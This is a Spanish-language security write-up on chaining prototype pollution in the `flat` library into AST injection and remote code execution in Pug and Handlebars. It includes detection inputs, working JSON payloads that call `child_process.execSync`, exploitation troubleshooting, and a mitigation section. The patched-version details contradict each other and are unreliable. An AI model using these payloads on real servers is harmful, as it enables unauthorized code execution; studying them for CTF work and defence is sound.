---
title: Prototype pollution y AST injection — de un merge inseguro a RCE
tags: [web, nodejs, prototype-pollution, ast-injection, pug, handlebars, flat]
---

# Prototype pollution → AST injection → RCE

[🇬🇧 English](prototype-pollution-ast.en.md) | **Español**

## 1. El fallo base

Un `merge`/`unflatten` recursivo que copia claves del JSON del atacante sin filtrar `__proto__`, `constructor` o `prototype` escribe en `Object.prototype`. A partir de ahí, **todo objeto del proceso** hereda esas propiedades.

```js
// flat@5.0.0: unflatten copia claves tal cual
const { unflatten } = require('flat');
const obj = unflatten(JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log({}.isAdmin); // true
```

La versión vulnerable es `flat` 5.0.0–5.0.2 (Snyk `SNYK-JS-FLAT-596927`); el arreglo está en 5.0.1+ para `unflatten` y en 5.0.1/6.0.1 para `flatten`.

## 2. Detección

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"a.__proto__.polluted": "yes"}
```

Tres variantes porque cada librería filtra cosas distintas. La comprobación es siempre la misma: enviar, provocar una respuesta que lea la propiedad y ver si aparece. Si el JSON se convierte con `unflatten({...})`, la clave con punto (`a.__proto__.x`) es la que llega.

## 3. Por qué la contaminación acaba en ejecución

Los motores de plantillas construyen un AST y después **generan código JavaScript** que se evalúa. Ese generador lee propiedades de los nodos con acceso normal:

```js
// pug: compiler.js
visit(node) {
  const handler = this[node.type]   // despacho por tipo
  return handler(node)
}
visitCode(node) {
  if (node.block) this.visit(node.block)   // bloque hijo
  this.buffer(`...${node.line}...`)        // línea para depuración
}
```

Si `node` no tiene `block`, el acceso sube por la cadena de prototipos y encuentra el `block` contaminado. El compilador lo trata como un nodo real y su `line` se escribe **dentro del código generado**. Con `new Function(...)` detrás, esa cadena se ejecuta.

Handlebars sufre lo mismo con otras propiedades: `Object.prototype.type = 'Program'` y `body`/`pendingContent` inyectan nodos en `accept()` y en el compilador.

## 4. Payloads reales

Pug (reto Gunship de HTB, `pug@3.0.x` + `flat@5.0.0`):

```json
{
  "artist.name": "Haigh",
  "__proto__.block": {
    "type": "Text",
    "line": "process.mainModule.require('child_process').execSync('id > /app/static/id.txt')"
  }
}
```

`artist.name` debe cumplir la comprobación de la app (`includes('Haigh')`) para que se compile la plantilla. `type: Text` es obligatorio: el compilador despacha por tipo y `line` es lo que se copia al código.

Handlebars (`handlebars@4.x`):

```json
{
  "__proto__.type": "Program",
  "__proto__.body": [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
      "type": "NumberLiteral",
      "value": "process.mainModule.require('child_process').execSync('id')"
    }],
    "loc": { "start": 0, "end": 0 }
  }]
}
```

## 5. Exfiltración

El `execSync` no devuelve nada al atacante por sí solo. Dos salidas:

- **Escribir en un directorio servido**: `/app/static/id.txt` y pedirlo por HTTP.
- **Leer la respuesta del propio render**: con `type: Text` y `val` en vez de `line`, el valor se imprime en la plantilla, útil para confirmar la contaminación antes de intentar RCE.

## 6. Errores típicos

- **La contaminación no persiste** → el proceso se reinicia entre peticiones (serverless, `nodemon`, `--watch`); envía la contaminación y el trigger en la misma vida del proceso.
- **`__proto__` se ignora** → el parser usa `Object.create(null)` o la librería ya está parcheada; prueba `constructor.prototype`.
- **Llega el payload pero no ejecuta** → el tipo del nodo no existe en el compilador (`Text`, `Code`, `Block`) o falta `line`; revisa la versión del motor.
- **`node.line` provoca error de sintaxis** → el código generado concatena tu cadena en una posición concreta; ajusta comillas o usa una sola expresión.

## 7. Detección y mitigación

- Rechazar `__proto__`, `constructor` y `prototype` en cualquier merge de entrada; usar `Object.create(null)` o `Map`.
- Actualizar `flat`, `lodash`, `qs`, `minimist` y los motores de plantillas; `npm audit` los marca.
- Node.js: `--disable-proto=throw` bloquea `__proto__` a nivel de runtime como defensa en profundidad.
- No compilar plantillas con opciones derivadas de la entrada; congelar `Object.prototype` (`Object.freeze`) en servicios expuestos.
- Detección: cuerpos JSON con `__proto__`, `constructor.prototype` o claves con puntos en APIs que no las esperan.

MITRE: T1190, T1059.007 (JavaScript), T1027.
